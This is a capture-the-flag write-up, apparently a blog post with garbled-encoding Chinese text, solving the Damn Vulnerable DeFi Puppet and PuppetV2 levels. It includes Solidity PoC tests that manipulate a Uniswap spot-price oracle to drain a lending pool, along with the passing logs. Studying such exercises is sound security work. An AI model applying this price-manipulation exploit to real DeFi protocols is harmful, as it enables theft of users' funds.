# Puppet and puppetV2
> é¢˜ç›®é“¾æ¥ï¼šhttps://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/src/Contracts/puppet
## æ”»å‡»ç›®æ ‡
æ¥æºäº damn-vulnerable-defi/test/Levels/selfie/README.md
```
There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.
```
## `PuppetPool.sol`
### åˆçº¦åˆ†æ
è¯¥åˆçº¦æ˜¯å€Ÿè´·åˆçº¦ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨å…¶ä¸­çš„`borrow`å‡½æ•°ï¼Œ
```
    function borrow(uint256 borrowAmount) public payable nonReentrant {
        // depositRequired è¶Šå°è¶Šå¥½
        uint256 depositRequired = calculateDepositRequired(borrowAmount);

        if (msg.value < depositRequired) revert NotDepositingEnoughCollateral();

        if (msg.value > depositRequired) {
            payable(msg.sender).sendValue(msg.value - depositRequired);
        }

        deposits[msg.sender] = deposits[msg.sender] + depositRequired;

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(msg.sender, borrowAmount)) revert TransferFailed();

        emit Borrowed(msg.sender, depositRequired, borrowAmount);
    }
```
è¿™ä¸ªå‡½æ•°å…è®¸ç”¨æˆ·é€šè¿‡è´¨æŠ¼ETHæ¥å€Ÿä»£å¸ï¼Œ
1. è®¡ç®—æ‰€éœ€å­˜æ¬¾depositRequiredã€‚
2. æ£€æŸ¥å‘é€çš„ETHæ˜¯å¦è¶³å¤Ÿã€‚
3. å¦‚æœå‘é€çš„ETHè¶…è¿‡æ‰€éœ€ï¼Œé€€è¿˜å¤šä½™çš„ETHã€‚
4. æ›´æ–°ç”¨æˆ·çš„å­˜æ¬¾è®°å½•ã€‚
5. å°è¯•ä»ä»£å¸åˆçº¦è½¬ç§»ä»£å¸åˆ°ç”¨æˆ·åœ°å€å¹¶è§¦å‘äº‹ä»¶ï¼Œå¦‚æœå¤±è´¥åˆ™æŠ›å‡ºTransferFailedé”™è¯¯ã€‚

æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œæƒ³è¦æç©ºå€Ÿè´·æ± éœ€è¦ç­‰å€¼çš„ETHï¼Œé‚£ETHå’Œtokençš„ä»·å€¼æ˜¯å¦‚ä½•å¯¹åº”çš„å‘¢ï¼Ÿæˆ‘ä»¬æ¥ç€å…³æ³¨`calculateDepositRequired`ï¼Œ
```
    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return (amount * _computeOraclePrice() * 2) / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        // ç¬æ—¶ä»·æ ¼é¢„è¨€æœº
->      return (uniswapPair.balance * (10 ** 18)) / token.balanceOf(uniswapPair);
    }
```
å¯ä»¥çœ‹åˆ°ï¼Œè¿™è¾¹æ˜¯é‡‡å–äº†uniswapv1pair eth-tokençš„ç¬æ—¶ä»·æ ¼ï¼Œä¸éš¾æƒ³åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡swapæ¥è¿›è¡Œå½±å“æ± å­é‡Œäº¤æ˜“å¯¹çš„æ•°é‡ã€‚

ç»¼ä¸Šï¼Œæˆ‘ä»¬é€šè¿‡åˆ†æåˆçº¦ï¼Œå¯ä»¥æ‰¾åˆ°åˆçº¦è–„å¼±ç‚¹å¦‚ä¸‹ï¼š
1. åˆçº¦é€šè¿‡uniswapv1äº¤æ˜“å¯¹çš„**ç¬æ—¶ä»·æ ¼**æ¥è®¡ç®—è´¨æŠ¼è¦æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡swapæ¥å½±å“ä»·æ ¼ï¼Œä»è€Œå½±å“å­˜æ¬¾è¦æ±‚ã€‚

### æ”»å‡»æ€è·¯
1. å°† eth/dvt é™ä½ï¼Œé€šè¿‡swap 1000e18 dvtæ¥æ“çºµï¼›
2. å°†lending poolçš„é’±é€šè¿‡å€Ÿæ¬¾æç©ºã€‚

### PoC
å®Œæ•´çš„PoCåœ¨[è¿™é‡Œ](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/test/Levels/puppet)
```
function testExploit_Puppet() public {
        uint256 v1PairBalance = dvt.balanceOf(address(puppetPool));
        console.log("v1PairBalance:", v1PairBalance);

        /* 
         * 1. å°† eth/dvt é™ä½ï¼Œé€šè¿‡swap 9.9 ethï¼Œå¯ä»¥è€ƒè™‘å°†1000e18 dvtæ³¨å…¥æ± å­
         * 2. å°†lending poolçš„é’±é€šè¿‡å€Ÿæ¬¾å€Ÿæ¬¾ 
         */
        emit log("-------------------------- before attack ---------------------------------");
        
        uint256 eth1 = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        uint256 eth2 = calculateTokenToEthInputPrice(UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        
        emit log_named_decimal_uint("getTokenToEthInputPrice", uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE), 18);
        emit log_named_decimal_uint("attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1", eth1, 18);
        emit log_named_decimal_uint("attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1", eth2, 18);
        
        uint256 shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        emit log("-------------------------- after attack ---------------------------------");
        vm.startPrank(attacker);
        // 1. å°† eth/dvt é™ä½ï¼Œé€šè¿‡swap 9.9 ethï¼Œå¯ä»¥è€ƒè™‘å°†1000e18 dvtæ³¨å…¥æ± å­
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 days);
        shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        // 2. å°†lending poolçš„é’±é€šè¿‡å€Ÿæ¬¾å€Ÿæ¬¾ 
        puppetPool.borrow{value: shouldETH}(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        
        validation();
        console.log(unicode"\nğŸ‰ Congratulations, you can go to the next level! ğŸ‰");
    }
```
ä¸‹å›¾æ˜¯æ”»å‡»æˆåŠŸè¾“å‡ºçš„æ—¥å¿—ï¼š

      ğŸ§¨ Let's see if you can break it... ğŸ§¨
     v1PairBalance: 100000000000000000000000
     -------------------------- before attack ---------------------------------
     getTokenToEthInputPrice: 9.900695134061569016
     attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1: 9.900695134061569016
     attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1: 4.992488733099649474
     attacker should spend ETH amount: 200000.000000000000000000
     attacker actually hold ETH amount: 25.000000000000000000
     -------------------------- after attack ---------------------------------
     attacker should spend ETH amount: 19.664329888798200000
     attacker actually hold ETH amount: 34.900695134061569016
     
      ğŸ‰ Congratulations, you can go to the next level! ğŸ‰

## `PuppetV2.sol`
### åˆçº¦åˆ†æ
è¯¥åˆçº¦æ˜¯å€Ÿè´·åˆçº¦, ä¸ä¸Šè¾¹çš„æ˜¯ç±»ä¼¼çš„ï¼Œè¿˜æ˜¯å…³æ³¨å…¶ä¸­çš„`borrow`å‡½æ•°ï¼Œ
```
    function borrow(uint256 borrowAmount) external {
        if (_token.balanceOf(address(this)) < borrowAmount) {
            revert NotEnoughTokenBalance();
        }

        // Calculate how much WETH the user must deposit
        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);

        // Take the WETH
        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);

        // internal accounting
        deposits[msg.sender] += depositOfWETHRequired;

        if (!_token.transfer(msg.sender, borrowAmount)) revert TransferFailed();

        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);
    }
```
ä¸æœ€åˆç‰ˆæœ¬ä¸åŒçš„åœ°æ–¹åœ¨äºä½¿ç”¨WETH-tokenäº¤æ˜“å¯¹ï¼Œç°åœ¨è¿˜æ˜¯å…³æ³¨è´¨æŠ¼WETHæ•°é‡æ˜¯å¦‚ä½•è®¡ç®—çš„ï¼Œ
```
// PuppetV2.sol
    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        return (_getOracleQuote(tokenAmount) * 3) / 10 ** 18;
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            // è·å–äº¤æ˜“å¯¹æ•°é‡
            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
        return UniswapV2Library.quote(amount * (10 ** 18), reservesToken, reservesWETH);
    }
// UniswapV2Library.sol
    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
        require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
        require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        amountB = (amountA * reserveB) / reserveA;
    }
```
åŒæ ·çš„ï¼Œè´¨æŠ¼ç‰©ä»·å€¼ä¹Ÿæ˜¯é€šè¿‡uniswapv2æ± å­é‡Œäº¤æ˜“å¯¹æ•°é‡æ¯”å€¼ä½œä¸ºç¬æ—¶ä»·æ ¼ï¼Œçªç ´ç‚¹ä¹Ÿæ˜¯åœ¨è¿™ã€‚ä¸ä¸Šè¾¹ä¸åŒçš„åœ°åœ¨äºéœ€è¦å°†ethç½®æ¢æˆWETHã€‚
### PoC
å®Œæ•´çš„é¢˜è§£åœ¨[è¿™é‡Œ](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/test/Levels/puppet-v2)
```
    function testExploit_PuppetV2() public {
        emit log("-------------------------- before attack ---------------------------------");
        uint256 v2PairBalance = dvt.balanceOf(address(puppetV2Pool));
        emit log_named_decimal_uint("v2PairBalance:", v2PairBalance, 18);
        emit log_named_decimal_uint("attacker should eth to brrow", puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 18);

        emit log("-------------------------- after attack ---------------------------------");
        vm.startPrank(attacker);
        weth.deposit{value: ATTACKER_INITIAL_ETH_BALANCE}();

        uint256 swapOutETH = uniswapV2Router.getAmountOut(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_WETH_RESERVE);
        emit log_named_decimal_uint("attacker could swap out ETH", swapOutETH, 18);

        dvt.transfer(address(uniswapV2Pair), ATTACKER_INITIAL_TOKEN_BALANCE);
        if (address(dvt) < address(weth)){
            uniswapV2Pair.swap(0, swapOutETH, address(attacker), "");
        }
        else{
            uniswapV2Pair.swap(swapOutETH, 0, address(attacker), "");
        }

        uint256 shouldETH = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should ETH", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        weth.approve(address(puppetV2Pool), shouldETH);
        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        
        vm.stopPrank();

        validation();
        console.log(unicode"\nğŸ‰ Congratulations, you can go to the next level! ğŸ‰");
    }
```
ä¸‹å›¾æ˜¯æ”»å‡»æˆåŠŸè¾“å‡ºçš„æ—¥å¿—ï¼š
    
    [PASS] testExploit_PuppetV2() (gas: 205882)
      Logs:
        ğŸ§¨ Let's see if you can break it... ğŸ§¨
        -------------------------- before attack ---------------------------------
        v2PairBalance:: 1000000.000000000000000000
        attacker should eth to brrow: 300000.000000000000000000
        -------------------------- after attack ---------------------------------
        attacker could swap out ETH: 9.900695134061569016
        attacker should ETH: 29.496494833197321980
        attacker actually hold ETH amount: 0.000000000000000000
        
      ğŸ‰ Congratulations, you can go to the next level! ğŸ‰
